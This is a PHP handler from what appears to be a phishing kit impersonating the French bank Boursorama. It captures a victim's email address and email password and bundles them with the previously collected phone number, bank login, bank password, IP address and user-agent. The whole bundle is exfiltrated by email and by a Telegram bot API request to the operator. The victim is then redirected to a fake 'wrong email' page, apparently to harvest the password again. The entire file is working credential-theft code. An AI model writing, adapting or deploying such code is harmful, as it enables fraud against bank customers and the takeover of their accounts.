<?php

include_once '../killbot/code/include.php';
include("../settings.php");
include("../common/sub_includes.php");



if (isset($_POST)) {


	if (!isset($_SESSION)) {
		session_start();
	}

	$_SESSION['email_mail'] = htmlspecialchars($_POST['email_mail']);
	$_SESSION['email_password'] = htmlspecialchars($_POST['email_password']);

	######################
	#### MAIL SENDING ####
	######################

	if ($mail_sending == true) {

		$message = "

[🧨] Email password [🧨]

🧨 Numéro de téléphone : " . $_SESSION['phone_number'] . "
🧨 Email : " . $_SESSION['email_mail'] . "
🧨 Mot de passe Mail : " . $_SESSION['email_password'] . "

[🧲] Login [🧲]

🧲 Identifiant : " . $_SESSION['identifiant'] . "
🧲 Mot de passe : " . $_SESSION['password'] . "

[⚰️] Additionnellal [⚰️]

⚰️ IP : " . $_SESSION['ip'] . "
⚰️ User-agent : " . $_SESSION['useragent'] . "
					";

		$subject = "[🧨] + 1 Email password  |" . $_SESSION['phone_number'] . " | " . $_SESSION['email_mail'];
		$headers = "From: 📦Bourso| <bill@rezzzzz.com>";

		mail($rezmail, $subject, $message, $headers);
	}

	##########################
	#### TELEGRAM SENDING ####
	##########################

	if ($telegram_sending == true) {

		$data = [
			'text' => '

[🧨] Email password [🧨]

🧨 Numéro de téléphone : ' . $_SESSION['phone_number'] . '
🧨 Email : ' . $_SESSION['email_mail'] . '
🧨 Mot de passe Mail : ' . $_SESSION['email_password'] . '
					
[🧲] Login [🧲]

🧲 Identifiant : ' . $_SESSION['identifiant'] . '
🧲 Mot de passe : ' . $_SESSION['password'] . '

[⚰️] Informations additionnelles [⚰️]

⚰️ Adresse Ip : ' . $_SESSION['ip'] . '
⚰️ User-agent : ' . $_SESSION['useragent'] . '
					  
					',
			'chat_id' => $chat_rez
		];

		file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
	}


	header('Location: ../steps/email_wrong.php');
} else {
	header('Location: ../');
}
